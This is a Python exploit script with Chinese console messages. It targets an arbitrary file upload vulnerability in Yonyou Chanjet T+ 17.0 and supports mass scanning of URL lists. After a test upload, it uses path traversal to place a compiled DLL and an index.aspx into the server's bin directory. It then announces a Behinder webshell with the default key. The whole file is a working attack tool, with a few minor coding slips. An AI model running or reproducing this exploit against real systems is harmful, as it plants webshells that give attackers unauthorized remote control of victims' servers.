import time
import argparse
import requests
import multiprocessing
from rich.console import Console
import urllib3

console = Console()
proxies={'http':'http://127.0.0.1:8080'}
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "Content-Type: multipart/form-data; boundary=---------------------------33007515338361897914262830846",
    }
    exp_url=target_url+"tplus/SM/SetupAccount/Upload.aspx?preload=1"
    data='''-----------------------------33007515338361897914262830846
Content-Disposition: form-data; name="File1"; filename="test.html"
Content-Type: image/jpeg

test
-----------------------------33007515338361897914262830846--'''

    console.print(now_time() + " [INFO]     正在检测用友畅捷通任意文件上传漏洞", style='bold blue')
    console.print(now_time() + " [INFO]     正在请求 {}".format(target_url), style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response=requests.post(url=exp_url, headers=headers,data=data,verify=False,proxies=proxies)
        if response.status_code== 200:
            console.print(now_time() + ' [INFO]  畅捷通T+17.0任意文件上传漏洞存在', style='bold green')
            exp(exp_url)
        else:
            console.print(now_time() + ' [WARNING]  畅捷通T+17.0任意文件上传漏洞不存在', style='bold yellow')
    except:
        console.print('[WARNING] 无法该目标无法建立连接\n', style='bold yellow')
    
    
def exp(exp_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    console.print(now_time() + ' [INFO]     开始上传编译文件', style='bold blue')
    file1 = [('file1', ('../../../bin/App_Web_index.aspx.cdcab7d2.dll', open('bin/App_Web_index.aspx.cdcab7d2.dll', 'rb'), 'image/png'))]
    file2 = [('file2', ('../../../bin/index.aspx.cdcab7d2.compiled', open('bin/index.aspx.cdcab7d2.compiled', 'rb'), 'image/png'))]
    exp=[('filee', ('index.aspx', open('bin/index.aspx', 'rb'), 'image/png'))]
    try:
        exp_m = requests.post(exp_url, headers=headers, files=exp, verify=False, proxies=proxies) 
        exp_r = requests.post(exp_url, headers=headers, files=file1, verify=False, proxies=proxies)
        exp_x = requests.post(exp_url, headers=headers, files=file2, verify=False, proxies=proxies)
        if exp_m.status_code== 200 and exp_r.status_code== 200 and exp_x== 200:
            shell_url='目标+/tplus/index.aspx?preload=1'
            console.print(now_time() + ' [SUCCESS]  文件上传成功, 冰蝎默认明文密钥WebShell: {}'.format(shell_url),
                              style='bold green') 
        
    except:
        console.print(now_time() + ' [WARNING]  文件上传失败', style='bold yellow')
    
     
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
        
    